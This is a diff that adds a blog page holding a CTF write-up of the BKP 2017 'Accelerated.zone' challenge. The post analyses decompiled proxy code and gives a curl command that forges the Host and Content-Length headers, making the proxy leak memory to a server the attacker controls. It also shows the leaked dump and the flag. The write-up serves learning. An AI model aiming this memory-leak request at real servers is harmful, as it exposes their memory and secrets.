@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BKP 2017 - Accelerated.zone | Born to Learn</title>
+<link rel="stylesheet" href="https://jiulongw.github.io/css/style.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/styles/github.min.css">
+
+
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://jiulongw.github.io"><h1 class="title is-4">Born to Learn</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/jiulongw">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/jiulongw">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="subtitle is-6 is-pulled-right">
+      
+      
+<a class="subtitle is-6" href="/tags/ctf">#CTF</a>
+
+
+
+| <a class="subtitle is-6" href="/tags/web">#Web</a>
+
+
+      
+    </div>
+    <h2 class="subtitle is-6">February 26, 2017</h2>
+    <h1 class="title">BKP 2017 - Accelerated.zone</h1>
+    <div class="content">
+      <p>Bleeding again.</p>
+
+<p></p>
+
+<h1 id="problem">Problem</h1>
+
+<p>We were given a reverse proxy at <a href="http://accelerated.zone:8000">http://accelerated.zone:8000</a> and the <a href="1" title="As you can see from the flag, the author wrote this challenge before Cloudbleed :).
+">binary</a> behind it.  It responds with
+<code>Get better cookies bro</code> if we send a plain GET request to it.  Looks like it expects some secret cookies.  Trying to
+access random pages reveals the actual web server was running at port 7733.  Nothing interesting at this point.  Let&rsquo;s
+look at the binary file instead.</p>
+
+<p>Open the binary using IDA we can see it uses <a href="https://www.gnu.org/software/libmicrohttpd/manual/html_node/index.html#SEC_Contents">libmicrohttpd</a> to serve incoming HTTP requests and <a href="https://curl.haxx.se/libcurl/">libcurl</a> to
+communicate with actual web server.  The two functions that we are interested are <code>handle_request</code> and <code>make_request</code>.</p>
+
+<p>In <code>handle_request</code>, it reads some properties from incoming HTTP request, and passed them to <code>make_request</code>.</p>
+
+<pre><code>......
+  LODWORD(v9) = MHD_get_connection_info(a3, 2LL);
+  v22 = *(_QWORD *)v9;
+  inet_ntop(2, (const void *)(*(_QWORD *)v9 + 4LL), &amp;buf, 0x10u);
+  LODWORD(v10) = MHD_lookup_connection_value(a3, 1LL, &quot;Host&quot;);
+  host = v10;
+  if ( *a5 != &amp;dummy_6361 )
+    _printf_chk(1LL, &quot;[%s:%d] %s %s %s %s\n&quot;, &amp;buf, *(_WORD *)(v22 + 2), method, a3a);
+  if ( strcmp(method, &quot;GET&quot;) || (result = strcmp(method, &quot;POST&quot;)) != 0 )
+  {
+    if ( *a5 == &amp;dummy_6361 )
+    {
+      if ( !strcmp(method, &quot;POST&quot;) )
+      {
+        LODWORD(v13) = MHD_lookup_connection_value(a3, 1LL, &quot;Content-Length&quot;);
+        length = atol(v13);
+      }
+      else
+      {
+        v6 = 0LL;
+        length = 0;
+      }
+      LODWORD(v15) = MHD_lookup_connection_value(a3, 1LL, &quot;Cookie&quot;);
+      cookies = v15;
+      a7 = 500LL;
+      MHD_suspend_connection(a3);
+      v17 = method;
+      v18 = make_request(host, method, a3a, v6, length, cookies, &amp;a7);
+      MHD_resume_connection(v7, v17);
+      v19 = MHD_queue_response(v7, (unsigned int)a7, v18);
+      MHD_destroy_response(v18);
+      result = v19;
+    }
+    else
+    {
+      *a5 = &amp;dummy_6361;
+      result = 1;
+    }
+  }
+......
+</code></pre>
+
+<p>In <code>make_request</code>, it constructs curl request using data from incoming request.</p>
+
+<pre><code>......
+  v11 = open_memstream(&amp;bufloc, &amp;sizeloc);
+  LODWORD(v12) = curl_easy_init(&amp;bufloc, &amp;sizeloc);
+  v13 = v12;
+  curl_easy_setopt(v12, 10002LL, ((unsigned __int64)&amp;v23 + 7) &amp; 0xFFFFFFFFFFFFFFF0LL);// set host
+  curl_easy_setopt(v13, 181LL, 1LL);            // protocol=1 (http only)
+  curl_easy_setopt(v13, 10001LL, v11);          // output (FILE* or void*)
+  curl_easy_setopt(v13, 13LL, 5LL);             // timeout = 5s
+  curl_easy_setopt(v13, 3LL, 7733LL);           // port = 7733
+  if ( v7 )
+  {
+    curl_easy_setopt(v13, 10015LL, v7);         // post static input fields
+    curl_easy_setopt(v13, 60LL, v22);           // size of post data
+  }
+  if ( v8 )
+    curl_easy_setopt(v13, 10022LL, v8);         // set cookie
+  v14 = curl_easy_perform(v13);
+  fclose(v11);
+  if ( v14 )
+  {
+    LODWORD(v15) = curl_easy_strerror((unsigned int)v14);
+    _fprintf_chk(stderr, 1LL, &quot;curl_easy_perform() failed: %s\n&quot;, v15);
+    *v23 = 500LL;
+    LODWORD(v16) = MHD_create_response_from_buffer(
+                     54LL,
+                     (__int64)&quot;&lt;html&gt;&lt;title&gt;Error!&lt;/title&gt;&lt;h1&gt;Error! Bad!&lt;/h1&gt;&lt;/html&gt;&quot;,
+                     0LL);
+    v17 = &quot;text/html&quot;;
+    v18 = v16;
+LABEL_8:
+    MHD_add_response_header(v18, &quot;Content-Type&quot;, v17);
+    goto LABEL_9;
+  }
+  curl_easy_getinfo_err_long();
+  curl_easy_getinfo((__int64)v13, 0x200002LL, (__int64)&amp;v23);// get response code
+  LODWORD(v19) = MHD_create_response_from_buffer(sizeloc, (__int64)bufloc, 1LL);
+......
+</code></pre>
+
+<p>The first attempt we tried was to ask the proxy to access a page that will redirect to a <code>file://</code> URI, so that
+we might be able to access files in the proxy server.  However, it didn&rsquo;t work.  It turns out for the redirection to work,
+we need <code>CURLOPT_FOLLOWLOCATION</code> and correct <code>CURLOPT_REDIR_PROTOCOLS</code>.  <code>file://</code> protocol was by default disabled for
+security reasons.</p>
+
+<p>The other thing that caught my eyes was that the proxy reads <code>Content-Length</code> header and used that value as the data size
+in the curl request.  That means I can fake a large <code>Content-Length</code> to the proxy, it will send me a bunch of data in the
+post request, which potentially contains senstive information.  This is similar to <a href="https://en.wikipedia.org/wiki/Heartbleed">SSL Heartbleed</a>, and recent
+<a href="https://en.wikipedia.org/wiki/Cloudbleed">Cloudbleed</a><sup class="footnote-ref" id="fnref:1"><a rel="footnote" href="#fn:1">1</a></sup>.</p>
+
+<pre><code>curl -H 'Host: server-that-i-control' -H 'Content-Length: 123456' \
+  --data 'a=a' http://accelerated.zone:8000
+</code></pre>
+
+<p>That was it.  I got the flag after sending several requests and eyeballed request dump for flag string.</p>
+
+<pre><code>$ strings postdata.bin 
+a=a
+/q?erjg
+HTTP/1.1 200 OK
+Date: Sat, 25 Feb 2017 23:42:56 GMT
+Server: Apache/2.4.10 (Debian)
+X-Powered-By: PHP/7.0.16
+Content-Length: 63
+Content-Type: text/html; charset=UTF-8
+FLAG{ISwearIWroteThisChallengeWeeksAgo}Get better cookies bro.  # Here you are!
+HTTP
+HTTP
+a-certif5
+/etc/ssl/certs/ca-certificates.crt
+/etc/ssl/certs
+ed.zone:%
+http://54.200.59.30/
+rcmd
+HTTP
+HTTP
+/etc/ssl/certs/ca-certificates.crt
+/etc/ssl/certs
+obHN&amp;nU?
+&gt;a2U0*
+HTTP/1.1 100 Continue
+</code></pre>
+<div class="footnotes">
+
+<hr />
+
+<ol>
+<li id="fn:1">As you can see from the flag, the author wrote this challenge before Cloudbleed :).
+ <a class="footnote-return" href="#fnref:1"><sup>[return]</sup></a></li>
+</ol>
+</div>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <aside><div id="disqus_thread"></div></aside>
+    <script type="text/javascript">
+      var disqus_shortname = 'jiulongw';
+      (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>&copy; <a href="https://jiulongw.github.io">jiulongw</a> 2016</p>
+  </div>
+</section>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/highlight.min.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/languages/ruby.min.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/languages/bash.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-86115491-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
